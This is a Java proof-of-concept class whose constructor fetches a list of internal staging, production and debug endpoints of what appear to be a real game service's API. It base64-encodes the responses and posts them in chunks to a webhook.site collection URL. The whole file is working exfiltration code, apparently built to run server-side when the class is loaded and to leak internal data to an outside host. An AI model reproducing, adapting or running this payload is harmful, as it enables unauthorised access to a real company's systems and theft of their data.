import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Base64;

public class poc {
    static final String WH = "https://webhook.site/b0de7905-1496-47b6-93a5-8529f9c02252";
    static final String[] URLS = {
        "https://example.com/",
        "https://api.abyss-stg-r18.dotabyss.dmmgames.com/resources%2Fwindows%2Fr18%2Faas%2F12436%2Faa%2Fcatalog_1.hash",
        "https://api.abyss-stg-2-r18.dotabyss.dmmgames.com/resources%2Fwindows%2Fr18%2Faas%2F12436%2Faa%2Fcatalog_1.hash",
        "https://api.abyss-stg-1-r18.dotabyss.dmmgames.com/resources%2Fwindows%2Fr18%2Faas%2F12436%2Faa%2Fcatalog_1.hash",
        "https://api.abyss-stg-r18.dotabyss.dmmgames.com/data%2F256",
        "https://api.abyss-stg-2-r18.dotabyss.dmmgames.com/data%2F270",
        "https://api.abyss-prod-r18.dotabyss.dmmgames.com/data%2F90",
        "https://api.abyss-stg-r18.dotabyss.dmmgames.com/",
        "https://api.abyss-stg-2-r18.dotabyss.dmmgames.com/",
        "https://api.abyss-stg-r18.dotabyss.dmmgames.com/debug-command/masterdata"
    };

    public poc() {
        StringBuilder sb = new StringBuilder("P11\n");
        for (int i = 0; i < URLS.length; i++) {
            sb.append(fetch(URLS[i]));
        }
        String data = sb.toString();
        int total = data.length();
        for (int i = 0; i < total && i < 4000000; i += 90000) {
            try { post("P11|" + i + "|" + data.substring(i, Math.min(total, i + 90000))); }
            catch (Throwable t) { }
        }
    }

    static void post(String s) throws Exception {
        HttpURLConnection c = (HttpURLConnection) new URL(WH).openConnection();
        c.setConnectTimeout(15000); c.setReadTimeout(30000);
        c.setRequestMethod("POST"); c.setDoOutput(true);
        c.setRequestProperty("Content-Type", "text/plain; charset=UTF-8");
        OutputStream os = c.getOutputStream(); os.write(s.getBytes("UTF-8")); os.flush(); os.close();
        try { c.getResponseCode(); } catch (Throwable t) { }
    }

    static String fetch(String u) {
        StringBuilder r = new StringBuilder();
        r.append("\n@@URL ").append(u).append("\n");
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(u).openConnection();
            c.setConnectTimeout(20000); c.setReadTimeout(30000);
            c.setInstanceFollowRedirects(false);
            c.setRequestProperty("User-Agent", "Mozilla/5.0");
            int code = c.getResponseCode();
            r.append("status=").append(code).append(" ct=").append(c.getContentType()).append("\n");
            InputStream in = (code >= 400) ? c.getErrorStream() : c.getInputStream();
            if (in == null) { r.append("(no body)\n"); return r.toString(); }
            ByteArrayOutputStream bo = new ByteArrayOutputStream();
            byte[] buf = new byte[8192]; int n; int total = 0;
            while ((n = in.read(buf)) > 0) { total += n; if (bo.size() < 200000) { bo.write(buf, 0, n); } }
            in.close();
            byte[] b = bo.toByteArray();
            r.append("len=").append(total).append(" captured=").append(b.length).append("\n");
            r.append("b64=").append(Base64.getEncoder().encodeToString(b)).append("\n");
        } catch (Throwable t) {
            r.append("EXC ").append(t).append("\n");
        }
        return r.toString();
    }
}
